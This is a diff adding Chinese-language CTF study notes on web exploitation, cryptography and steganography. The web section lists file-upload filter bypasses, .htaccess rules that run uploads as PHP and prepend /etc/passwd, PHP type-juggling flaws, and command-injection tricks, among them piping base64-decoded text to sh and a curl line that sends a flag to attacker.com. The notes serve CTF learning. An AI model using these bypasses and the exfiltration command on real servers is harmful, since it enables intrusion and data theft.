@@ -1,0 +1,197 @@
+- Web - 网络应用
+- Reverse Engineering - 逆向
+- Pwn - 二进制安全
+  - Mobile - 移动安全
+
+- Crypto - 密码学
+- Misc - 杂项
+  - 取证
+
+# Web
+
+Web题和渗透测试重合度高，首先参照[渗透测试笔记](./penetration.md)。此笔记记载CTF比赛会用到，但是实战中用处不大的技巧
+
+## SQL注入
+
+用Union注入拼接不同字符集的字段，可能导致`Illegal mix of collations for operation`错误，可用`convert`函数：
+
+```sql
+SELECT title FROM articles
+UNION
+SELECT group_concat(convert(column_name using gbk)) FROM information_schema.columns;
+```
+
+## 文件上传
+
+- 后缀黑名单绕过
+  - 大小写，双写
+  - 冷门后缀：php可能解析`php5` / `pht` / `phtml` / `shtml` / `pwml`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本的服务器基本不可能成功
+  - 系统命名绕过：Windows系统可尝试`shell.php.`（末尾句点）、`shell.php%20`（末尾空格）、`shell.php:1.jpg`（冒号）、`shell.php::$DATA`（文件流）；Linux系统可尝试`index.php/.`、`./aa/../index.php/.`
+  - **`.user.ini`文件**：适用于PHP 5.3以上，需要服务器处于CGI / Fast CGI模式，且上传目录下有PHP脚本，比如index.php。构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行`01.gif`
+  - **`.htaccess`文件**：适用于apache服务器，需要服务器配置`AllowOverride`（也有说法称需要开启`rewrite`模块、需要Thread Safe版本PHP）
+
+- 后缀白名单绕过
+  - 00截断：部分操作系统创建/重命名文件API把空字节当作字符串结束（C语言传统）。若服务器不做校验，可能服务器看到文件名是`shell.php%00.jpg`、`/shell.php%00/a.jpg`，操作系统创建文件名被截断编程`shell.php`。PHP<5.3.29且关闭magic quotes、JDK 6.0等有此漏洞
+
+- MIME
+- 文件头
+  - 可能使用的php函数：
+  - `exif_imagetype`，`finfo_file`：读取前几个字节，通过[File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)（也叫做文件头、Magic Number）识别文件格式
+  - `getimagesize`：读取图片元数据。它不会检测文件是否合法，因此只要文件头正确、元数据所在位置有东西（即，文件够大）就有返回值
+
+
+
+`.htaccess`文件：
+
+```htaccess
+# 将.pwn文件当作php解析
+AddType application/x-httpd-php .pwn
+
+# 将文件名包含pwn的文件作为php解析（CTF中也可以省略标签，直接把全部文件当作php解析）
+<FilesMatch "pwn">
+    Sethandler application/x-httpd-php
+</FilesMatch>
+
+# 本地文件包含
+php_value auto_prepend_file /etc/passwd
+
+# .htaccess关键词绕过。使用反斜杠续行
+AddTy\
+pe application/x-httpd-php .pwn
+```
+
+### 其他
+
+XBM文件：一种纯文本图像格式，文件头两行如下
+
+```c
+#define width 16
+#define height 16
+```
+
+PHP标签过滤：可以考虑使用`<script language="PHP"></script>`
+
+## 代码审计
+
+旧版本（PHP 7以前）弱类型漏洞较多。没有测旧版本，用PHP 8.2基本无法复现
+
+参考：[CTF-PHP黑魔法](https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/)
+
+- 数字比较缺陷
+  - 比较两个字符串时可能都当作数字。`"42E+1" == "0042.0"`，`"1e1" == "0xa"`
+  - 比较数字和字符串时只比较开头（应该是`intval`类型转换问题导致，详见`invtval`缺陷）。`"admin" == 0`，`"1admin" == 1`，`"0e12f" == "0e123456" == 0`
+  - 列表总是大于数字、字符串。`['a'] > 'a'`
+- 函数缺陷。部分函数遇到非法输入时不报错，而是返回一些奇怪的值
+  - `intval`转换错误：`intval("42hello") = 42`，`intval("hello") = 0`
+  - `md5, sha1`返回NULL：`md5(列表) = NULL`
+  - `strcmp`返回0：`strcmp("abc", ["haha"])`
+  - `ereg`（旧版本正则匹配）`%00`截断：`ereg("\d+", "123\x00-payload") = true`
+  - `preg_match`返回0：`preg_match`
+
+## 命令执行
+
+### 基础知识
+
+截断符号：继续执行`;`、管道符`|`、后台执行`&`、逻辑运算`||, &&`、换行符``。还可能用括号、引号闭合语句注入
+
+Shell扩展：参考[Linux笔记](../system/Linux.md#Shell扩展)
+
+### 绕过技巧
+
+- 关键字过滤：可能限制指令、特殊字符、文件名
+  - 类似指令。查看文件：`cat, tac, less, more, head, tail, nl, sort, rev, grep`；读取并编码：`od, base64, xxd`；文本编辑：`vi, vim, nano`
+  - 编码绕过：`echo "Y2F0IGZsYWcudHh0" | base64 -d | sh`，`echo 63617420666c61672e706870 | xxd -r -p | bash`
+  - Shell扩展引号移除绕过：`c""at fla\g.txt`
+  - Shell扩展文件名扩展绕过：`cat f[k-m]a?.txt`
+  - Shell扩展参数扩展绕过：`a=ca;${a}t flag.txt`
+- 空格过滤
+  - 空白符`\t, ${IFS}, $IFS$9, %0d%0a`代替
+  - Shell扩展绕过：`{cat,flag.txt}`
+- 长度限制
+- 回显限制
+  - 用带外信息带出，如`curl http://attacker.com/$flag` 
+  - 盲注
+
+## 其他
+
+伪造IP地址：`X-Forwarded-For, Client-IP, X-Real-IP, X-Remote-IP`
+
+# Crypto
+
+## 加密算法
+
+### 古典密码
+
+凯撒、栅栏、维吉尼亚；词频分析、暴力破解；CyberChef
+
+- 替换密码：将每个字符按照替换为另一个字符
+  - 凯撒密码：每个字母按照字母表顺序移动固定数目
+  - 埃特巴什码：将字母表第一个字母替换为最后一个，第二个字母换为倒数第二个，以此类推
+  - 弗吉尼亚密码：选定一个关键字，重复它直到长度与明文相同，将明文字母偏移到密钥对应字母，如某一位的明文是B，密钥是K，则密文是L（明文B是第二个字母，从密钥K开始数两个字母，得到密文L）
+- 移位密码：字母不变，但位置更改
+  - 栅栏密码
+
+### 对称加密算法
+
+优缺点：快；密钥分配与认证困难
+
+分类：分组加密（又称为块密码）、流加密。前者将明文分割为固定长度的分组（如每64比特一组），每个分组分别加密。加密过程中通常经过多轮置换、代换等操作，安全性高。后者通过生成伪随机密钥流，与明文每一位做位运算（通常是异或），实时性好，但安全性不如分组加密。分组加密有ECB、CBC等[工作模式](https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F)
+
+常用算法：DES，TripleDES，AES，RC4/5，IDEA
+
+- DES（Data Encryption Standard，数据加密标准），分组加密算法，分组长度64 bit，密钥长度64 bit（56比特有效长度+8比特校验位）。密钥长度较短，有可能暴力破解
+- TripleDES（也称作3DES），用DES对明文进行三次操作：K1加密、K2解密、K3加密。解密时则反过来，K3解密、K2加密、K1解密。其中K1和K3常用同一个密码
+- AES，密钥长度128 / 192 / 256 bit（16 / 24 / 32 byte）
+- IDEA
+
+攻击：ECB模式弱点、Padding Oracle：pwntools
+
+### 非对称加密算法
+
+优缺点：密钥分发方便；慢
+
+用途：保密通信、数字签名、对称密钥分发
+
+RSA，ECC，背包，Rabin，DH
+
+### 散列函数
+
+特征：不可逆、无碰撞、雪崩
+
+常用算法：MD5、SHA
+
+用途：文件完整性校验、密码存储、身份认证（原理：$HMAC(key, message)$）
+
+### 国密算法
+
+国密算法是国家密码管理局认定的国产密码算法体系，目前包含
+
+- 对称加密：SM1、4、7
+- 非对称加密：SM2、9，基于ECC（椭圆曲线密码）
+- 散列：SM3
+- 流密码：ZUC
+
+## 攻击
+
+- 唯密文攻击：只拥有密文
+- 已知明文攻击：拥有密文与对应的明文
+- 选择明文攻击：拥有加密权限，能够对明文加密后获得相应密文
+- 选择密文攻击：拥有解密权限，能够对密文解密后获得相应明文
+
+# Misc
+
+## 隐写
+
+### 基础
+
+```shell
+file secret.zip                # 根据文件头探测文件格式
+strings secret.zip | grep CTF  # 显示可打印字符，常能获得特殊编码信息
+binwalk secret.zip             # 识别拼接在一起的文件。注意：有几率误报
+binwalk -e secret.zip          # 拆分拼接的文件
+```
+
+小的文件也可以直接用010Editor人工检查
+
+## 流量分析
+
